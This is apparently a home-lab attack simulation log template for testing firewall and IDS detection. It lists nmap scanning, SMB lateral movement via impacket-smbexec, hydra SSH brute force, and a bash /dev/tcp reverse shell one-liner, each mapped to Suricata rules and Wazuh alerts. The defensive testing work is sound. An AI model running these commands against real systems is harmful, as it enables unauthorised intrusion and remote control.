# Attack Simulation Execution Log

> **Instructions:** Run each simulation from inside the Kali container:
> ```bash
> docker exec -it clab-network-seg-lab-kali bash
> bash /opt/attacks/01-nmap-scan.sh
> ```
> After each attack, capture a screenshot of the Wazuh alert and update the "Actual Outcome" column.

---

## Simulation 01 — External Port Scan (T1046)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/01-nmap-scan.sh` |
| **MITRE Technique** | T1046 — Network Service Discovery |
| **Attacker** | kali (10.10.10.20, DMZ) |
| **Target** | 10.10.20.0/24 (Internal zone) |
| **Attack Command** | `nmap -sS -T4 --top-ports 1000 10.10.20.10` |
| **Expected VyOS action** | Forward only HTTP (80/443) — all other ports filtered |
| **Expected Suricata SID** | 9001004 (SYN sweep threshold), 9001005 (Nmap probe string) |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: network-scan |
| **Evidence screenshot** | `screenshots/03-suricata-alert.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _[ fill in after running ]_ |

---

## Simulation 02 — SMB Lateral Movement (T1021.002)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/02-smb-lateral.sh` |
| **MITRE Technique** | T1021.002 — Remote Services: SMB/Windows Admin Shares |
| **Attacker** | kali (10.10.10.20, DMZ) |
| **Target** | workstation (10.10.20.10, Internal) port 445 |
| **Attack Command** | `smbclient -L //10.10.20.10 -N` + `impacket-smbexec` |
| **Expected VyOS action** | BLOCK — DMZ-TO-INTERNAL allows HTTP only; 445 dropped |
| **Expected Suricata SID** | 9001001, 9001002, 9001014 |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: policy-violation |
| **Evidence screenshot** | `screenshots/02-vyos-policy-log.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _VyOS drop + Suricata alert = two layers demonstrated_ |

---

## Simulation 03 — SSH Brute Force (T1110.001)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/03-ssh-bruteforce.sh` |
| **MITRE Technique** | T1110.001 — Brute Force: Password Guessing |
| **Attacker** | kali (10.10.10.20, DMZ) |
| **Target** | workstation (10.10.20.10) port 22 |
| **Attack Command** | `hydra -l root -P wordlist.txt ssh://10.10.20.10` |
| **Expected VyOS action** | BLOCK — DMZ-TO-INTERNAL HTTP-only; SSH dropped |
| **Expected Suricata SID** | 9001011 (threshold: 5 SYN in 30s) |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: attempted-admin |
| **Evidence screenshot** | `screenshots/05-attack-execution.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _Also correlates with SOC Lab Sysmon Event 4625 if agent is on workstation_ |

---

## Simulation 04 — DNS Tunneling Exfiltration (T1048.003)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/04-dns-tunnel.sh` |
| **MITRE Technique** | T1048.003 — Exfiltration Over Alternative Protocol: DNS |
| **Attacker** | kali (10.10.10.20, DMZ) simulating agent in Data zone |
| **Target** | External DNS resolver (8.8.8.8) |
| **Attack Command** | High-frequency DNS queries with 50+ char subdomain labels |
| **Expected VyOS action** | ALLOW (DNS egress not blocked by default) — firewall gap |
| **Expected Suricata SID** | 9001007 (long subdomain PCRE), 9001008 (frequency threshold) |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: trojan-activity |
| **Evidence screenshot** | `screenshots/03-suricata-alert.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _Key demo: VyOS allows DNS, Suricata is the only detection layer_ |

---

## Simulation 05 — Reverse Shell (T1059.004)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/05-reverse-shell.sh` |
| **MITRE Technique** | T1059.004 — Command and Scripting Interpreter: Unix Shell |
| **Attacker** | kali (10.10.10.20) listening; simulated victim callback |
| **Target** | kali listener port 4444 |
| **Attack Command** | `bash -i >& /dev/tcp/10.10.10.20/4444 0>&1` |
| **Expected VyOS action** | Block outbound from non-DMZ zones (stateful) |
| **Expected Suricata SID** | 9001009 (/dev/tcp/ string), 9001010 (python socket) |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: trojan-activity |
| **Evidence screenshot** | `screenshots/05-attack-execution.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _Content match fires even on blocked connection attempt_ |

---

## Simulation 06 — ICMP Covert Channel (T1095)

| Field | Detail |
|-------|--------|
| **Script** | `tests/attacks/06-icmp-covert.sh` |
| **MITRE Technique** | T1095 — Non-Application Layer Protocol |
| **Attacker** | kali (10.10.10.20, DMZ) |
| **Target** | workstation (10.10.20.10, Internal) |
| **Attack Command** | `ping -c 5 -s 600 10.10.20.10` (oversized payload) |
| **Expected VyOS action** | ALLOW — ICMP permitted for diagnostics (firewall gap) |
| **Expected Suricata SID** | 9001012 (ICMP dsize > 512), 9001013 (ICMP flood threshold) |
| **Expected Wazuh alert** | rule.groups: suricata, data.alert.classtype: policy-violation |
| **Evidence screenshot** | `screenshots/04-wazuh-correlated-event.png` |
| **Actual Outcome** | _[ fill in after running ]_ |
| **Notes** | _Best demo of "VyOS misses it, Suricata catches it" — defense-in-depth layering_ |

---

## Cross-Simulation Notes

**Simulations proving unified detection (SOC Lab + Network Lab):**
- Sim 03 (SSH brute force): Suricata sees network-layer SYN flood; Sysmon Event 4625 (if agent present)
- Sim 05 (Reverse shell): Suricata sees /dev/tcp/ pattern; Sysmon Event 1 (process creation)
- Sim 04 (DNS tunnel): Suricata sees high-frequency DNS; Sysmon Event 22 (DNS query)

**False positive tuning log:**
| SID | Scenario | FP Rate | Tuning Applied |
|-----|----------|---------|----------------|
| 9001004 | Legitimate nmap from admin zone | Medium | Add `!$MGMT_NET` to src exclusion if needed |
| 9001010 | Python socket in legitimate apps | Medium | Add known-good src exclusion |
| 9001008 | High-volume DNS from internal resolver | Low | Increase threshold to 20/10s for internal |
